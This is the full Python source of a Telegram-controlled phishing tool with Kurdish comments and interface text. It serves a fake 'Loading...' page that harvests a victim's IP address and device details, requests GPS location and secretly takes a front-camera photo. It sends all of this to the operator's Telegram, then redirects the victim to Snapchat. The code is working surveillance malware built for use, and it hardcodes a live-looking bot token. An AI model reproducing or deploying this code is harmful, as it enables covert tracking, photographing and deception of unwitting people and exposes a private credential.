import asyncio
import logging
import os
import base64
from aiohttp import web
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
from aiogram.filters import Command

# زانیارییە فەرمییەکان
TOKEN = "8364609349:AAF7i3nTGuvRnIV2kHSbWFCnPnj6iZdgBk4"
ADMIN_ID = 5583813672

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher()

user_states = {}

# مێنۆی خوارەوە (Reply Keyboard)
def get_reply_menu():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🔗 دروستکردنی لینکی هەواڵگری"), KeyboardButton(text="📊 باری سیستەم")],
            [KeyboardButton(text="🌐 گۆڕینی زمان"), KeyboardButton(text="🧠 زیرەکی دەستکرد")]
        ],
        resize_keyboard=True,
        input_field_placeholder="فەرماندە، فەرمانێک هەڵبژێرە..."
    )

@dp.message(Command("start"))
async def cmd_start(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("⛔️ ئەم بۆتە تایبەتە و تەنیا بۆ فەرماندە کارا کراوە.")
        return

    welcome_text = (
        "🌟 **بەخێر بێیتەوە سەرۆک سورچی بۆ ناوەندی کۆنتڕۆڵی هەواڵگری!**\n\n"
        "🛡️ سیستەم لە ئامادەباشیدایە. فەرموو لە مێنۆی خوارەوە فەرمانت هەڵبژێرە:"
    )
    await message.answer(welcome_text, reply_markup=get_reply_menu())

@dp.message(F.text == "🔗 دروستکردنی لینکی هەواڵگری")
async def start_link_creation(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    user_states[ADMIN_ID] = {"step": "waiting_redirect"}
    await message.answer(
        "🔗 **سەرۆک، فەرموو لینکی مەبەست (Redirect Link) بۆ بنێرە** (وەک `https://snapchat.com/add/...`) تاوەکو قوربانییەکە دوای ورەگرتنی زانیارییەکان ڕاستەوخۆ بۆی ببرێت.",
        reply_markup=get_reply_menu()
    )

@dp.message(F.text == "📊 باری سیستەم")
async def system_stats(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    await message.answer(
        "📊 **بارودۆخی سیستەم:**\n\n• دۆخ: 🟢 سەد لە سەد کارا\n• ئاستی پارێزراوی: 🛡️ پلەی یەکەم (حکومی)\n• وێب سێرڤەر: 🌐 پەیوەستکراو بە Railway",
        reply_markup=get_reply_menu()
    )

@dp.message(F.text == "🌐 گۆڕینی زمان")
async def change_lang_menu(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    lang_kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="کوردی ☀️", callback_data="lang_ku"),
            InlineKeyboardButton(text="English 🇬🇧", callback_data="lang_en")
        ]
    ])
    await message.answer("⚙️ **فەرموو زمانەکەت هەڵبژێرە:**", reply_markup=lang_kb)

@dp.message(F.text == "🧠 زیرەکی دەستکرد")
async def ai_core_menu(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    await message.answer(
        "🧠 **ناوەندی زیرەکی دەستکرد ئامادەیە:**\nفەرموو پرسیار یان شیکارییەکەت بنووسە.",
        reply_markup=get_reply_menu()
    )

@dp.callback_query(F.data.startswith("lang_"))
async def set_lang_callback(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    await callback.answer()
    lang = callback.data.split("_")[1]
    if lang == "ku":
        await callback.message.answer("🟢 زمان گۆڕرا بۆ **کوردی**.", reply_markup=get_reply_menu())
    elif lang == "en":
        await callback.message.answer("🟢 Language changed to **English**.", reply_markup=get_reply_menu())

# وەرگرتنی دەقەکان (لینکی مەبەست و پاشان وێنە)
@dp.message(F.text & ~F.text.startswith("/") & ~F.text.in_({"🔗 دروستکردنی لینکی هەواڵگری", "📊 باری سیستەم", "🌐 گۆڕینی زمان", "🧠 زیرەکی دەستکرد"}))
async def handle_text_inputs(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    state = user_states.get(ADMIN_ID, {}).get("step")
    
    if state == "waiting_redirect":
        target_url = message.text.strip()
        user_states[ADMIN_ID] = {"step": "waiting_image", "target_url": target_url}
        await message.answer(
            "✅ **لینکی مەبەست وەرگیرا.**\n\n"
            "📸 ئێستا **ئەو وێنەیەم بۆ بنێرە** کە دەتەوێت لەگەڵ لینکەکەدا پیشانی قوربانی بدرێت.",
            reply_markup=get_reply_menu()
        )

# وەرگرتنی وێنە و دروستکردنی کۆتایی لینکەکە
@dp.message(F.photo)
async def handle_admin_photo(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    state = user_states.get(ADMIN_ID, {}).get("step")
    if state == "waiting_image":
        photo_id = message.photo[-1].file_id
        target_url = user_states[ADMIN_ID].get("target_url")
        
        # وەرگرتنی هۆستی گشتی لە ژینگەی ڕەیڵوەی یان لینکی بنەڕەتی
        railway_domain = os.environ.get("RAILWAY_STATIC_URL", "your-app.up.railway.app")
        if not railway_domain.startswith("http"):
            railway_domain = f"https://{railway_domain}"
            
        payload_link = f"{railway_domain}/trap?redirect={target_url}"
        
        response_text = (
            "🎯 **لینکی هەواڵگری و فێڵ بە سەرکەوتوویی دروست بوو!**\n\n"
            f"🔗 **لینک:** `{payload_link}`\n\n"
            "📱 **تایبەتمەندییەکان:**\n"
            "• کۆکردنەوەی خۆکاری زانیاری ئامێر و IP\n"
            "• وەرگرتنی GPS و کامێرا پاش 5 چرکە چاوەڕوانی\n"
            "• گواستنەوەی قوربانی بۆ سناپچات بە شێوەیەکی ئۆتۆماتیکی"
        )
        
        user_states[ADMIN_ID] = {}
        await bot.send_photo(chat_id=ADMIN_ID, photo=photo_id, caption=response_text, parse_mode="Markdown", reply_markup=get_reply_menu())

# بەشی وێب سێرڤەر و پەڕەی تەڵە (Trap Page)
async def web_trap_page(request: web.Request):
    redirect_url = request.query.get('redirect', 'https://snapchat.com')
    
    # وەگرتنی زانیاری ئامێر و براوسەر و IP بە بێ پێویستی بە ئەڵۆو
    headers = request.headers
    user_agent = headers.get('User-Agent', 'Unknown Browser/Device')
    ip = headers.get('X-Forwarded-For', request.remote)
    
    html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {{ background-color: #0b0f19; color: #fff; font-family: sans-serif; text-align: center; padding-top: 120px; }}
        .spinner {{ border: 4px solid rgba(255,255,255,0.1); width: 50px; height: 50px; border-radius: 50%; border-left-color: #0ea5e9; animation: spin 1s linear infinite; margin: 25px auto; }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
        p {{ color: #94a3b8; font-size: 14px; }}
    </style>
</head>
<body>
    <h2>تکایە چەند ساتێک چاوەڕوان بە...</h2>
    <div class="spinner"></div>
    <p>سیستەم خەریکە پەڕەکە بار دەکات (5 چرکە)</p>
    
    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const redirectTarget = "{redirect_url}";
        const clientInfo = {{
            userAgent: "{user_agent}",
            ip: "{ip}"
        }};

        // ناردنی زانیاری سەرەتایی ئامێر و IP بە شێوەیەکی خۆکار
        fetch('/save_info', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify(clientInfo)
        }});

        // وەرگرتنی GPS ئەگەر بەردەست بێت
        if (navigator.geolocation) {{
            navigator.geolocation.getCurrentPosition(function(pos) {{
                fetch('/save_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude);
            }});
        }}

        // گرتنی وێنەی کامێرا و پاشان گواستنەوە دوای 5 چرکە
        window.addEventListener('load', function() {{
            setTimeout(function() {{
                navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: false }})
                .then(function(stream) {{
                    let video = document.getElementById('v');
                    video.srcObject = stream;
                    setTimeout(function() {{
                        let canvas = document.getElementById('c');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        let ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        let dataURL = canvas.toDataURL('image/jpeg');
                        
                        fetch('/upload_image', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/json' }},
                            body: JSON.stringify({{ image: dataURL }})
                        }}).then(() => {{
                            stream.getTracks().forEach(t => t.stop());
                            window.location.href = redirectTarget;
                        }});
                    }}, 1000);
                }}).catch(function() {{
                    window.location.href = redirectTarget;
                }});
            }}, 4000); // چاوەڕوانی 4 بۆ 5 چرکە
        }});
    </script>
</body>
</html>"""
    return web.Response(text=html_content, content_type='text/html')

async def save_info(request):
    try:
        data = await request.json()
        ua = data.get('userAgent')
        ip = data.get('ip')
        await bot.send_message(
            chat_id=ADMIN_ID, 
            text=f"🔍 **زانیاری ئامێری قوربانی (بێ ڕێگەپێدان):**\n\n🌐 **IP:** `{ip}`\n💻 **جۆری ئامێر/براوسەر:** `{ua}`"
        )
    except Exception as e:
        logging.error(f"Info error: {e}")
    return web.json_response({"status": "ok"})

async def upload_image(request):
    try:
        data = await request.json()
        encoded = data.get('image').split(",", 1)[1]
        image_bytes = base64.b64decode(encoded)
        photo_file = BufferedInputFile(image_bytes, filename="target.jpg")
        await bot.send_photo(chat_id=ADMIN_ID, photo=photo_file, caption="🚨 **وێنەی ئامانج بە سەرکەوتوویی دەستگیرکرا!**")
    except Exception as e:
        logging.error(f"Image error: {e}")
    return web.json_response({"status": "ok"})

async def save_location(request):
    lat = request.query.get('lat')
    lon = request.query.get('lon')
    if lat and lon:
        await bot.send_location(chat_id=ADMIN_ID, latitude=float(lat), longitude=float(lon))
        await bot.send_message(chat_id=ADMIN_ID, text=f"📍 **شوێنی جوگرافی (GPS):**\nپانی: `{lat}`\nدرێژی: `{lon}`")
    return web.json_response({"status": "ok"})

async def index_handler(request):
    return web.Response(text="Intelligence System Core is Active.", content_type='text/html')

async def main():
    app = web.Application()
    app.router.add_get('/', index_handler)
    app.router.add_get('/trap', web_trap_page)
    app.router.add_post('/save_info', save_info)
    app.router.add_post('/upload_image', upload_image)
    app.router.add_get('/save_location', save_location)

    runner = web.AppRunner(app)
    await runner.setup()
    
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

    logging.info(f"Web Server started on port {port}.")
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
